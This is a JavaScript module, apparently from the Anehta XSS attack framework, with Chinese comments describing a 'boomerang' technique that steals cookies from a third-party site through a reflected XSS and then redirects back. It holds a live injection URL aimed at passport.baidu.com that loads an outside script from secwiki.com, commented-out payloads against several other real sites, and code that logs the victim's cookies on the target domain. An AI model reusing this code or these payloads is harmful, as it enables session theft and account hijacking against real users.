////////////////////////////////////////////////////////
// boomerang 回旋镖模块，获取第三方远程站点的cookie
// 并将页面重定向回当前页面
// 要求远程站点存在一个xss
// 似乎在本模块中第三方站点很难加载上 base64.js
//// Author: axis
///////////////////////////////////////////////////////
//alert("Boomerang.js 回旋镖模块");


////////////////////////////////////////////////////////////
var target_domain = "passport.baidu.com";
var target="http://passport.baidu.com/?getmypass&username=\"];document.write('<script src=http://www.secwiki.com/anehta/feed.js></script>');//";
//var target="http://www.b.com/4.html#'><script src=\'"+feedurl+"\' ></script><'"; 
//var target="http://www.underwoodlandcompany.com/?pg=asdf<script src=\'"+feedurl+"\'></script>";
//var target="http://www.waikikicondosearch.com/?pg=asdf<script src=\'"+feedurl+"\'></script>";
//var target="http://www.gobolinux.org/?page=<script src="+feedurl+"></script>";

// 前页面
var org_url = "http://www.secwiki.com/anehta/demo.html";
var org_domain = "www.secwiki.com";
//var org_url = "http://www.b.com/anehta/test.html";
//var org_domain = "www.b.com";

 
// 如果是当前页面，则向目标提交
if ($d.domain == org_domain){
   if (anehta.dom.checkCookie("boomerang") == false){
   	  // 在cookie里做标记，只弹一次
	    anehta.dom.addCookie("boomerang", "x");
	    //alert(anehta.dom.getCookie("boomerang"));
   	  setTimeout( function (){
	      //alert(target);
        try {
            anehta.net.postForm(target);
        } catch (e){
            //alert(e);
        }
      },
      50);
   }
}


// 如果是目标站点，则重定向回前页面 
if ($d.domain == target_domain){
	
	//clx模块太慢了
	 anehta.logger.logCookie();
	 setTimeout( function (){
     // 弹回原来的页面。
     anehta.net.postForm(org_url);
   },
   50);
}


